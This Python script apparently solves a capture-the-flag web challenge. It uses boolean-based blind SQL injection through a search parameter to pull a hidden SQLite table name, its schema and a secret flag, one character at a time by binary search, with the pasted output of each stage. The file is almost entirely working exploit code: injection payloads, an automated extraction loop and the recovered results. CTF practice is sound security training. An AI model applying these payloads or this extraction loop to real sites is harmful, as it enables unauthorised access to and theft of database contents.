import requests
import string

BASE_URL = "http://ssof2526.challenges.cwte.me:25262/"
true_answer = "Found 4 articles with search query"

def payload_1(char_position, ascii_threshold):
    return f"' AND UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' AND name <> 'user' AND name <> 'blog_post'), {char_position}, 1)) > {ascii_threshold} ; -- "

# the above query checks if the unicode value of the character at position `char_position` and in the table name 
# if r.text contains "Found 4 articles with search query", then the condition is true
# using binary search:

table_name = ""
for position in range(1, 25):  
    low, high = 0, 130  # includes printable ASCII
    while low <= high:
        mid = (low + high) // 2
        injection = payload_1(position, mid)
        r = requests.get(BASE_URL, params={"search": injection})
        if true_answer in r.text:
            low = mid + 1
        else:
            high = mid - 1
    table_name += chr(low)
    print(f"Current table name: {table_name}")
print(f"Discovered table name: {table_name}")

# Output:
"""
└─$ python3 sql.py
Current table name: s
Current table name: su
Current table name: sup
Current table name: supe
Current table name: super
Current table name: super_
Current table name: super_s
Current table name: super_s_
Current table name: super_s_s
Current table name: super_s_so
Current table name: super_s_sof
Current table name: super_s_sof_
Current table name: super_s_sof_s
Current table name: super_s_sof_se
Current table name: super_s_sof_sec
Current table name: super_s_sof_secr
Current table name: super_s_sof_secre
Current table name: super_s_sof_secret
Current table name: super_s_sof_secrets
...
Discovered table name: super_s_sof_secrets

"""

def payload_2(char_position, ascii_threshold):
    return f"' AND UNICODE(SUBSTR((SELECT sql FROM sqlite_master WHERE type='table' AND name <> 'user' AND name <> 'blog_post'), {char_position}, 1)) > {ascii_threshold} ; -- "

table_info = ""
for position in range(1, 100):  
    low, high = 0, 130  # includes printable ASCII
    while low <= high:
        mid = (low + high) // 2
        injection = payload_2(position, mid)
        r = requests.get(BASE_URL, params={"search": injection})
        if true_answer in r.text:
            low = mid + 1
        else:
            high = mid - 1
    table_info += chr(low)
    print(f"Current table info: {table_info}")
print(f"Discovered table info: {table_info}")

# Output:
"""
Discovered table info: CREATE TABLE super_s_sof_secrets (
        id INTEGER NOT NULL, 
        secret TEXT, 
        PRIMARY KEY (id)
)
"""

def payload_3(char_position, ascii_threshold):
    return f"' AND UNICODE(SUBSTR((SELECT secret FROM super_s_sof_secrets), {char_position}, 1)) > {ascii_threshold} ; -- "

secret_content = ""
for position in range(1, 120):  
    low, high = 0, 130  # includes printable ASCII
    while low <= high:
        mid = (low + high) // 2
        injection = payload_3(position, mid)
        r = requests.get(BASE_URL, params={"search": injection})
        if true_answer in r.text:
            low = mid + 1
        else:
            high = mid - 1
    secret_content += chr(low)
    print(f"Current secret content: {secret_content}")
print(f"Discovered secret content: {secret_content}")

# Output:
""" 
Discovered secret content: In case I forget my password is: SSof{I_am_just_partially_blind_since_I_can_gEt_yoUr_datA_using_Boolean_Injections}
"""